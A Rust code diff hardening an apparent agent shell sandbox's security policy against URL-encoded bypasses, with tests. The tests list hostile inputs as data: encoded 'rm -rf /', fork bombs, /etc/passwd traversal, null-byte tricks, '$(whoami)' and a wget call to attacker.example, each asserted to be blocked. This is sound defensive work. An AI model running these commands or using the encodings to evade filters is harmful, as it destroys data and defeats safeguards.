@@ -328,6 +328,11 @@ impl SecurityPolicy {
 
     /// Classify command risk. Any high-risk segment marks the whole command high.
     pub fn command_risk_level(&self, command: &str) -> CommandRiskLevel {
+        let command = iterative_url_decode(command);
+        if command.contains('%') {
+            return CommandRiskLevel::High;
+        }
+
         // Early exit on the raw command catches snippets that span segment
         // boundaries (e.g. fork bombs containing `;`).  The per-segment check
         // below is intentionally kept for snippets that appear within a single
@@ -336,7 +341,7 @@ impl SecurityPolicy {
             return CommandRiskLevel::High;
         }
 
-        let normalized = normalize_risk_segments(command);
+        let normalized = normalize_risk_segments(&command);
 
         let mut saw_medium = false;
 
@@ -421,11 +426,16 @@ impl SecurityPolicy {
             return false;
         }
 
-        if self.contains_blocked_operators(command) {
+        let command = iterative_url_decode(command);
+        if command.contains('%') {
             return false;
         }
 
-        self.validate_command_segments(command)
+        if self.contains_blocked_operators(&command) {
+            return false;
+        }
+
+        self.validate_command_segments(&command)
     }
 
     fn contains_blocked_operators(&self, command: &str) -> bool {
@@ -579,19 +589,11 @@ impl SecurityPolicy {
 
     /// Check if a file path is allowed (no path traversal, within workspace)
     pub fn is_path_allowed(&self, path: &str) -> bool {
-        // Block null bytes (can truncate paths in C-backed syscalls)
-        if path.contains('\0') {
-            return false;
-        }
+        let decoded = iterative_url_decode(path);
 
-        // Iterative URL decoding to prevent bypasses like %252e%252e (double-encoded "..")
-        let mut decoded = path.to_string();
-        for _ in 0..3 {
-            let next = urlencoding::decode(&decoded).unwrap_or_else(|_| decoded.clone().into());
-            if next == decoded {
-                break;
-            }
-            decoded = next.into_owned();
+        // Block null bytes (can truncate paths in C-backed syscalls)
+        if decoded.contains('\0') {
+            return false;
         }
 
         // Block backslashes (Windows-style separators or escaping)
@@ -830,6 +832,18 @@ fn normalize_arg_for_path_checks(token: &str) -> Option<String> {
 }
 
 /// Check whether `expanded` path starts with any of the forbidden paths.
+fn iterative_url_decode(input: &str) -> String {
+    let mut decoded = input.to_string();
+    for _ in 0..10 {
+        let next = urlencoding::decode(decoded.as_str()).unwrap_or_else(|_| decoded.clone().into());
+        if next == decoded {
+            break;
+        }
+        decoded = next.into_owned();
+    }
+    decoded
+}
+
 fn matches_any_forbidden_path(expanded: &str, forbidden_paths: &[String]) -> bool {
     let expanded_path = Path::new(expanded);
     for forbidden in forbidden_paths {
@@ -2029,6 +2043,71 @@ mod tests {
             policy.command_risk_level("wget http://attacker.example/file"),
             CommandRiskLevel::High,
             "wget must be High risk in delegated sessions"
+        );
+    }
+
+    #[test]
+    fn is_command_allowed_blocks_url_encoded_bypasses() {
+        let p = default_policy();
+
+        assert!(!p.is_command_allowed("echo secret %3e /tmp/pwned"));
+        assert!(!p.is_command_allowed("echo secret %3E /tmp/pwned"));
+        assert!(!p.is_command_allowed("ls %26 rm -rf /"));
+        assert!(!p.is_command_allowed("echo %24%28whoami%29"));
+        assert!(!p.is_command_allowed("cat ..%2f..%2fetc%2fpasswd"));
+        assert!(!p.is_command_allowed("cat secret.txt%00.jpg"));
+    }
+
+    #[test]
+    fn is_path_allowed_blocks_encoded_null_bytes() {
+        let p = default_policy();
+        assert!(!p.is_path_allowed("file.txt%00"));
+        assert!(!p.is_path_allowed("%00file.txt"));
+    }
+
+    #[test]
+    fn command_risk_level_detects_encoded_dangerous_snippets() {
+        let p = default_policy();
+        assert_eq!(
+            p.command_risk_level("rm%20-rf%20%2f"),
+            CommandRiskLevel::High
+        );
+
+        let encoded_fork = "%3a%28%29%7b%3a%7c%3a%26%7d%3b%3a";
+        assert_eq!(p.command_risk_level(encoded_fork), CommandRiskLevel::High);
+    }
+
+    #[test]
+    fn deep_encoded_traversal_attacks_blocked() {
+        let p = default_policy();
+
+        assert!(
+            !p.is_command_allowed("cat %2525252e%2525252e/etc/passwd"),
+            "Deep-encoded traversal in cat command must be blocked"
+        );
+        assert!(
+            !p.is_path_allowed("%2525252e%2525252e/etc/passwd"),
+            "Deep-encoded traversal path must be blocked"
+        );
+        assert_eq!(
+            p.command_risk_level("rm %2525252e%2525252e/etc/passwd"),
+            CommandRiskLevel::High,
+            "Deep-encoded rm must be classified as High risk"
+        );
+        assert!(
+            !p.is_command_allowed("rm %2525252e%2525252e/etc/passwd"),
+            "Deep-encoded rm command must be blocked"
+        );
+
+        let deep_fork = "%253a%2528%2529%257b%253a%257c%253a%2526%257d%253b%253a";
+        assert_eq!(
+            p.command_risk_level(deep_fork),
+            CommandRiskLevel::High,
+            "Deep-encoded fork bomb must be classified as High risk"
+        );
+        assert!(
+            !p.is_command_allowed(deep_fork),
+            "Deep-encoded fork bomb must be blocked"
         );
     }
 
